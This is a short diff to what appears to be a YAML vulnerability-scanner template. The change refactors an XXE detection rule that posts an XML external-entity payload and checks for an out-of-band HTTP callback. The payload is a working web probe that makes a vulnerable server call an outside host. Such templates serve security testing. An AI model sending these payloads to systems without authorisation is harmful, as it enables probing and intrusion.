@@ -14,8 +14,6 @@ info:
   created: 2025/08/25
 
 set:
-  oob: oob()
-  oobHTTP: oob.HTTP
   hostname: request.url.host
 
 rules:
@@ -27,10 +25,10 @@ rules:
         Content-Type: application/xml
       body: |
         <?xml version="1.0"?>
-        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "{{oobHTTP}}">]>
+        <!DOCTYPE foo [<!ENTITY xxe SYSTEM "{{oob.HTTP}}">]>
         <request>
         <data>&xxe;</data>
         </request>
-    expression: response.status == 200 && oobCheck(oob, oob.ProtocolHTTP, 3)
+    expression: response.status == 200 && oobCheck(oob.ProtocolHTTP, 3)
 
 expression: r0()
